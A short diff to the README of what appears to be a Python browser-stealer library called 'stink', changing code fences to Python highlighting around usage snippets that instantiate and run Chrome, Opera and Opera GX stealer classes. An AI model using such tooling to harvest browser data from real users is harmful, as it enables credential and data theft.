@@ -63,7 +63,7 @@ stealer = Chrome(storage_path=storage_path, storage_folder=storage_folder)
 stealer.run()
 ```
 #### Opera
-```
+```python
 from os import path, mkdir
 
 from stink.browsers.opera_default import Opera_Default
@@ -80,7 +80,7 @@ stealer = Opera_Default(storage_path=storage_path, storage_folder=storage_folder
 stealer.run()
 ```
 #### Opera GX
-```
+```python
 from os import path, mkdir
 
 from stink.browsers.opera_gx import Opera_GX
